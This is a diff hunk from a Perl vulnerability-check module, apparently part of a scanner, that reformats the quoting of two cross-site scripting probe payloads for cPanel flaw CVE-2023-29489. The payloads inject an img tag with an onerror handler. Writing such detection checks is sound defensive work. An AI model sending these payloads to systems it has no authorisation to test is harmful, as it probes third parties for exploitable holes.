@@ -23,8 +23,8 @@ package Spellbook::Advisory::CVE_2023_29489 {
             my $user_agent = Spellbook::Core::UserAgent -> new();
 
             my @payloads = (
-                "cpanelwebcall/<img%20src=x%20onerror=\"prompt(1)\">aaaaaaaaaaaa",
-                "<img%20src=x%20onerror=\"prompt(1)\">aaaaaaaaaaaa"
+                q{cpanelwebcall/<img%20src=x%20onerror="prompt(1)">aaaaaaaaaaaa},
+                q{<img%20src=x%20onerror="prompt(1)">aaaaaaaaaaaa}
             );
 
             foreach my $payload (@payloads) {
